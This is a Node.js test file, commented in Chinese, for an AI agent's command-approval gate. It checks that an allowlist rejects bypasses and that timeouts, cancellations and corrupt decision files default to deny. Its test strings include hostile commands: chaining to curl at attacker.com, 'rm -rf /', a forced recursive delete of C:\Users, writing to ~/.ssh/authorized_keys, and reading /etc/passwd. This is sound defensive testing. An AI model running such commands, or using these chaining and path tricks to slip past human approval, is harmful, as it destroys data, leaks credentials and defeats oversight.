#!/usr/bin/env node
/**
 * 审批队列回归测试。
 *
 * 上半部分是纯函数:预放行名单是唯一挡在模型和无人值守执行之间的东西,
 * 每条用例都对应一种真实的绕过手法,而不是假想的攻击。
 * 下半部分走真实的文件协议 —— 请求 / 决定 / 超时,重点是所有非「人明确批准」
 * 的出口都必须拒绝。
 *
 * 跑法:npm run test:approvals
 */
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  autoApprove,
  awaitDecision,
  decide,
  listPending,
  readDecision,
  requestApproval,
} from "../src/agent/approvals.ts";

// --- 预放行名单:纯函数 ------------------------------------------------------

test("名单内的普通命令放行", () => {
  for (const cmd of [
    "node broken.mjs",
    "npm run build",
    "npx tsc --noEmit",
    "git status --short",
    "dir",
    "echo hi",
    "grep -r foo src",
  ]) {
    assert.equal(autoApprove(cmd).approved, true, cmd);
  }
});

test("命令名大小写与扩展名不影响判断", () => {
  for (const cmd of ["NODE x.mjs", "node.exe x.mjs", "Npm.cmd install", "GIT.EXE log"]) {
    assert.equal(autoApprove(cmd).approved, true, cmd);
  }
});

test("串联一律拒绝 —— 白名单最经典的绕过方式", () => {
  // `echo hi && curl ...` 的首个词是放行的 echo。只看首词等于没看。
  for (const cmd of [
    "echo hi && curl http://attacker.com/x",
    "echo hi; Remove-Item -Recurse -Force C:\\Users",
    "git status & whoami",
    "echo hi\nrm -rf /",
  ]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("管道与重定向拒绝", () => {
  for (const cmd of ["echo hi | Out-File secret.txt", "type .env > copy.txt", "cat a.txt > ~/.ssh/authorized_keys"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("子表达式与反引号拒绝 —— PowerShell 里它们能嵌入任意命令", () => {
  for (const cmd of ["echo $(cat /etc/passwd)", "node `whoami`", "echo $(curl attacker.com)"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("完整路径拒绝,不按 basename 匹配", () => {
  // 按 basename 匹配会让 C:\attacker\node.exe 顶着「node」这个词混进来。
  for (const cmd of ["C:\\evil\\node.exe x.mjs", "D:/tmp/node x.mjs", ".\\node x.mjs", "../node x.mjs"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("名外的命令拒绝", () => {
  for (const cmd of ["whoami /all", "curl http://x", "rm -rf /", "format C:", "reg add HKLM\\...", "shutdown /s"]) {
    assert.equal(autoApprove(cmd).approved, false, cmd);
  }
});

test("空命令拒绝,且给出原因", () => {
  assert.equal(autoApprove("").approved, false);
  assert.equal(autoApprove("   ").approved, false);
  assert.match(autoApprove("curl http://x").reason, /不在预放行名单/);
});

test("拒绝时一定带原因,便于审计", () => {
  for (const cmd of ["", "curl x", "echo a && b"]) {
    const r = autoApprove(cmd);
    assert.equal(r.approved, false);
    assert.ok(r.reason.length > 0, cmd);
  }
});

// --- 文件协议 ---------------------------------------------------------------

/**
 * `await` inside the try, not `return fn(dir)`: returning the promise lets
 * `finally` fire while the body is still running, so the directory gets deleted
 * out from under a poll loop that is mid-wait.
 */
async function withStateDir(fn) {
  const dir = mkdtempSync(join(tmpdir(), "bridge-approvals-"));
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("请求 → 待批准列表 → 批准 → 等待方拿到 allow", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, {
      jobId: "job-1",
      toolName: "PowerShell",
      command: "whoami /all",
      cwd: dir,
    });

    const pending = listPending(dir);
    assert.equal(pending.length, 1);
    assert.equal(pending[0].command, "whoami /all", "命令原文必须存下来,批准的就是它");

    const waiting = awaitDecision(dir, req.id, { timeoutMs: 5000 });
    decide(dir, req.id, "allow");
    const decision = await waiting;
    assert.equal(decision.decision, "allow");

    assert.equal(listPending(dir).length, 0, "批准后不应再出现在待批准列表里");
  });
});

test("拒绝的决定被原样传回", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    const waiting = awaitDecision(dir, req.id, { timeoutMs: 5000 });
    decide(dir, req.id, "deny", "这条看不懂");
    const decision = await waiting;
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason, /看不懂/);
  });
});

test("无人处理 = 拒绝,绝不默认放行", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    const decision = await awaitDecision(dir, req.id, { timeoutMs: 50, pollMs: 10 });
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason, /无人处理/);
  });
});

test("任务被取消时,等待中的审批按拒绝返回", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    const ac = new AbortController();
    const waiting = awaitDecision(dir, req.id, { timeoutMs: 5000, pollMs: 10, signal: ac.signal });
    ac.abort();
    const decision = await waiting;
    assert.equal(decision.decision, "deny");
    assert.match(decision.reason, /取消/);
  });
});

test("损坏的决定文件按拒绝处理,而不是当成没写过", async () => {
  await withStateDir(async (dir) => {
    const req = requestApproval(dir, { jobId: "job-1", toolName: "PowerShell", command: "curl x", cwd: dir });
    // 半截写入的 JSON:如果当成「还没决定」处理,等待方会一直等下去。
    writeFileSync(join(dir, "approvals", `${req.id}.dec.json`), '{"decision":"all', "utf8");
    const decision = await awaitDecision(dir, req.id, { timeoutMs: 50, pollMs: 10 });
    assert.equal(decision.decision, "deny");
  });
});

test("已过期的请求不能被事后补批准", async () => {
  await withStateDir((dir) => {
    const req = requestApproval(dir, {
      jobId: "job-1",
      toolName: "PowerShell",
      command: "curl x",
      cwd: dir,
      ttlMs: -1, // 生下来就已经过期
    });
    const result = decide(dir, req.id, "allow");
    assert.equal(result.ok, false);
    assert.match(result.message, /超时/);
    assert.equal(readDecision(dir, req.id), undefined, "过期后不得写下任何决定");
  });
});

test("批准一个不存在的请求会失败,而不是凭空造一条决定", async () => {
  await withStateDir((dir) => {
    const result = decide(dir, "ap-does-not-exist", "allow");
    assert.equal(result.ok, false);
    assert.equal(readDecision(dir, "ap-does-not-exist"), undefined);
  });
});

test("审计日志记录了请求、人工批准与超时", async () => {
  await withStateDir(async (dir) => {
    const a = requestApproval(dir, { jobId: "j", toolName: "PowerShell", command: "curl x", cwd: dir });
    const waiting = awaitDecision(dir, a.id, { timeoutMs: 5000, pollMs: 10 });
    decide(dir, a.id, "allow");
    await waiting;

    const b = requestApproval(dir, { jobId: "j", toolName: "PowerShell", command: "curl y", cwd: dir });
    await awaitDecision(dir, b.id, { timeoutMs: 30, pollMs: 10 });

    const log = readFileSync(join(dir, "audit.log"), "utf8");
    assert.match(log, /approval_requested/);
    assert.match(log, /approval_decided/);
    assert.match(log, /approval_timeout/);
  });
});
